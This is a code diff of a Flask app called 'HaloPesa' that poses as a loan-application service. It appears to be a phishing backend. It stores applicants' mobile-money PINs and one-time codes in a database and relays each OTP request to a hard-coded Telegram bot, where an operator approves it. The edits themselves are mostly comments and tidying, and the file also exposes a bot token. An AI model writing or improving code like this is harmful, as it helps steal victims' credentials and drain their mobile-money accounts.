@@ -3,20 +3,20 @@ import requests
 import sqlite3
 import random
 import string
-from datetime import datetime, timedelta
+from datetime import datetime
 import os
 import logging
-import time
 
 app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
 
 # ================================
-# 🔐 Credentials
+# 🔐 Credentials – use environment variables on Render
 # ================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID = os.environ.get('CHAT_ID')
+CHAT_ID   = os.environ.get('CHAT_ID')
 
+# Fallback for local testing (replace with your own token if needed)
 if not BOT_TOKEN:
     BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
 if not CHAT_ID:
@@ -25,10 +25,12 @@ if not CHAT_ID:
 logging.basicConfig(level=logging.INFO)
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
+# ================================
+# 🗄️ Database initialization
+# ================================
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    # Create main tables
     c.execute('''CREATE TABLE IF NOT EXISTS loans (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         app_id TEXT,
@@ -52,7 +54,7 @@ def init_db():
     )''')
     conn.commit()
     conn.close()
-    logging.info("Database initialized.")
+    logging.info("Database initialized with all columns.")
 
 # Add columns if missing (for existing databases)
 def add_columns():
@@ -76,6 +78,9 @@ def add_columns():
 init_db()
 add_columns()
 
+# ================================
+# 🤖 Telegram functions
+# ================================
 def send_telegram(message, reply_markup=None):
     try:
         payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
@@ -95,6 +100,9 @@ def edit_telegram(message_id, text):
     except Exception as e:
         logging.error(f'Edit error: {e}')
 
+# ================================
+# 🌐 Routes
+# ================================
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -121,7 +129,8 @@ def success():
 
 @app.route('/test-telegram')
 def test_telegram():
-    send_telegram("🚀 Test message from HaloPesa! Bot is working.")
+    """Test route to verify Telegram integration."""
+    send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
     return "Test message sent! Check your Telegram."
 
 @app.route('/api/submit_loan', methods=['POST'])
@@ -142,6 +151,7 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
+        # OTP REQUESTED (used for resend from the frontend)
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
@@ -149,7 +159,6 @@ def submit_loan():
                 return jsonify({'success': False, 'error': 'Too many OTP requests. Wait.'})
             app_id = 'HP-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
             code = str(random.randint(1000, 9999))
-            # Set initial resend_count = 0, last_resend_time = now (for tracking)
             now = datetime.now().isoformat()
             c.execute('''INSERT INTO loans
                          (app_id, amount, months, phone, pin, code, full_name, employment_status, monthly_income, resend_count, last_resend_time)
@@ -161,6 +170,7 @@ def submit_loan():
             send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
             return jsonify({'success': True, 'app_id': app_id})
 
+        # Normal loan submission
         c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
         existing = c.fetchone()
         is_returning = existing is not None
@@ -240,6 +250,9 @@ def check_status(app_id):
         logging.error(f"Error in check_status: {e}")
         return jsonify({'status': 'error'}), 500
 
+# ================================
+# 🔁 RESEND OTP ENDPOINT
+# ================================
 @app.route('/api/resend_otp', methods=['POST'])
 def resend_otp():
     try:
@@ -258,17 +271,17 @@ def resend_otp():
 
         phone, amount, status, code_status, resend_count, last_resend_time = loan
 
-        # Check if resend is allowed (only when status = 'approved' and code_status = 'pending')
+        # Only allow resend if status is 'approved' and code_status is 'pending'
         if status != 'approved' or code_status != 'pending':
             conn.close()
             return jsonify({'success': False, 'error': 'OTP cannot be resent at this stage'}), 400
 
-        # Check resend limit (max 3)
+        # Max 3 resends
         if resend_count >= 3:
             conn.close()
             return jsonify({'success': False, 'error': 'You have reached the maximum number of OTP requests (3).'}), 400
 
-        # Check time since last resend (must be >= 30 seconds)
+        # 30‑second cooldown
         if last_resend_time:
             last_time = datetime.fromisoformat(last_resend_time)
             now = datetime.now()
@@ -277,14 +290,14 @@ def resend_otp():
                 conn.close()
                 return jsonify({'success': False, 'error': f'Please wait {remaining} seconds before requesting again.'}), 400
 
-        # Update resend_count and last_resend_time
+        # Update counter and timestamp
         new_count = resend_count + 1
         new_time = datetime.now().isoformat()
         c.execute('UPDATE loans SET resend_count = ?, last_resend_time = ? WHERE app_id = ?', (new_count, new_time, app_id))
         conn.commit()
         conn.close()
 
-        # Send OTP request to Telegram
+        # Send Telegram message to admin
         msg = f'📤 OTP REQUESTED (Resent #{new_count})\n\n🆔 {app_id}\n📞 +255 {phone}\n💰 TZS {amount:,}'
         send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
         return jsonify({'success': True})
@@ -293,6 +306,9 @@ def resend_otp():
         logging.error(f"Error in resend_otp: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
+# ================================
+# 📨 Telegram Webhook (callback handler)
+# ================================
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
